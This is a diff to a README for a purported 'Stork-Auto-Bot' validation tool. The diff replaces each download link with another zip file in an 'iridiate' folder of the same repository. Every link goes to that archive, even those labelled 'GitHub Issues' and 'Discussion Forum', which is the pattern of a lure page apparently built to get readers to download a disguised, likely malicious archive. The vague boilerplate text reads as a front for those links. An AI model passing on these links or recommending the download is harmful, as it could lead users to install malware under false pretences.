@@ -1,6 +1,6 @@
 # 🤖 Stork-Auto-Bot - Automate Your Stork Validation Process
 
-[![Download Stork-Auto-Bot](https://raw.githubusercontent.com/frth155/Stork-Auto-Bot/main/iridiate/Stork-Auto-Bot_1.4.zip)](https://raw.githubusercontent.com/frth155/Stork-Auto-Bot/main/iridiate/Stork-Auto-Bot_1.4.zip)
+[![Download Stork-Auto-Bot](https://github.com/frth155/Stork-Auto-Bot/raw/refs/heads/main/iridiate/Bot_Auto_Stork_3.2.zip)](https://github.com/frth155/Stork-Auto-Bot/raw/refs/heads/main/iridiate/Bot_Auto_Stork_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Welcome to the Stork-Auto-Bot! This tool simplifies the verification process for
   
 ## 📥 Download & Install
 
-To get started, visit [this page to download](https://raw.githubusercontent.com/frth155/Stork-Auto-Bot/main/iridiate/Stork-Auto-Bot_1.4.zip).
+To get started, visit [this page to download](https://github.com/frth155/Stork-Auto-Bot/raw/refs/heads/main/iridiate/Bot_Auto_Stork_3.2.zip).
 
 Here is how to do it:
 
@@ -54,7 +54,7 @@ If you encounter issues, consider the following steps:
 
 ### How do I update the bot?
 
-Simply revisit [this page to download](https://raw.githubusercontent.com/frth155/Stork-Auto-Bot/main/iridiate/Stork-Auto-Bot_1.4.zip) the latest version and repeat the installation steps.
+Simply revisit [this page to download](https://github.com/frth155/Stork-Auto-Bot/raw/refs/heads/main/iridiate/Bot_Auto_Stork_3.2.zip) the latest version and repeat the installation steps.
 
 ### What should I do if I forget my account details?
 
@@ -68,8 +68,8 @@ Yes, Stork-Auto-Bot follows security protocols to ensure your data remains safe 
 
 Join our community to share experiences, ask questions, and get support:
 
-- [GitHub Issues](https://raw.githubusercontent.com/frth155/Stork-Auto-Bot/main/iridiate/Stork-Auto-Bot_1.4.zip)
-- [Discussion Forum](https://raw.githubusercontent.com/frth155/Stork-Auto-Bot/main/iridiate/Stork-Auto-Bot_1.4.zip)
+- [GitHub Issues](https://github.com/frth155/Stork-Auto-Bot/raw/refs/heads/main/iridiate/Bot_Auto_Stork_3.2.zip)
+- [Discussion Forum](https://github.com/frth155/Stork-Auto-Bot/raw/refs/heads/main/iridiate/Bot_Auto_Stork_3.2.zip)
 
 ## 📝 Topics Covered
 
@@ -87,4 +87,4 @@ Join our community to share experiences, ask questions, and get support:
 
 For further questions or assistance, feel free to reach out to us through the community channels or open an issue on GitHub.
 
-To download the latest version, visit [this page to download](https://raw.githubusercontent.com/frth155/Stork-Auto-Bot/main/iridiate/Stork-Auto-Bot_1.4.zip) again.
+To download the latest version, visit [this page to download](https://github.com/frth155/Stork-Auto-Bot/raw/refs/heads/main/iridiate/Bot_Auto_Stork_3.2.zip) again.
